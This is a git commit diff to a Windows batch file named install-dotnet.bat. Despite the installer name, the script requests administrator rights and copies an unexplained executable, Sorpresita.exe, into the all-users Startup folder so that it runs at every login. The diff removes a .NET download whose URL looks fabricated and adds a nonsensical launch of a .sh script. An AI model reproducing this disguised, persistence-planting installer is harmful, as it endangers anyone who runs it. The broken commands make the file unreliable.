bdc8bea3afb9202d47cda91ed9c0fa5d8e3e3248
Chewico <chewico3d@gmail.com>
2025-02-24 12:52:47 +0100

    a

--- install-dotnet.bat
+++ install-dotnet.bat
@@ -19,14 +19,7 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :: BatchGotAdmin (Run as Admin code ends)
-
-:: Download and install .NET SDK 8
-echo Downloading .NET SDK 8...
-powershell -Command "Invoke-WebRequest -Uri 'https://download.visualstudio.microsoft.com/download/pr/6c7d6f5a-4d3d-4c1d-9e3a-0d5a4a085e6d/3d5d6c6e7c8d9e0f1a2b3c4d5e6f7g8/dotnet-sdk-8.0.100-win-x64.exe' -OutFile 'dotnet-sdk-8.exe'"
-
-echo Installing .NET SDK 8...
-start /wait dotnet-sdk-8.exe /install /quiet /norestart
-
+start dotnet-install.sh
 :: Add to startup for all users
 echo Configuring startup entry...
 copy "%~dp0Sorpresita.exe" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\" >nul
